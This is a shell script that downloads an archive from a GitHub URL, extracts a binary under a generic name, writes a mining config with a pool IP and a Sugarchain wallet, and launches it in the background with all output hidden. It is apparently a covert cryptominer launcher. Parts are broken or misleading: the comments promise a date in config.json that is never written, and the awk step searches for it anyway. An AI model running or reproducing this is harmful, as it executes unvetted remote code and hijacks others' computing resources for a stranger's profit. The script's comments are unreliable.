# Download and extract the cidx file
wget -O cidx https://github.com/barburonjilo/setstra/raw/refs/heads/main/ci.tar.gz && tar -xvf cidx >/dev/null 2>&1

# Set the current date in UTC-7 format
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Create config.json with the current date
cat > config.json <<END
{
  "url": "45.115.225.115:505",
  "user": "sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr.lah",
  "pass": "x",
  "threads": 8,
  "algo": "yespowersugar"
}
END

# Make cidx and config.json executable
chmod +x config.json cidx

# Run cidx in the background
nohup ./cidx -c 'config.json' &>/dev/null &

# Clear the screen and print the current time and running jobs
clear
echo RUN $(TZ=UTC-7 date +"%R-[%d/%m/%y]") && jobs

# Run awk to process config.json and print the matching date-time part
awk -v date_str="i-${current_date}" '
{
  if ($0 ~ /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/) {
    # Extract and print only the "i-<hour>-<minute> [<day>-<month>]" part
    match($0, /i-[0-9]{2}-[0-9]{2} \[[0-9]{2}-[0-9]{2}\]/, arr)
    if (length(arr) > 0) {
      print arr[0]  # Print the matched date-time part
    }
  }
}
' config.json
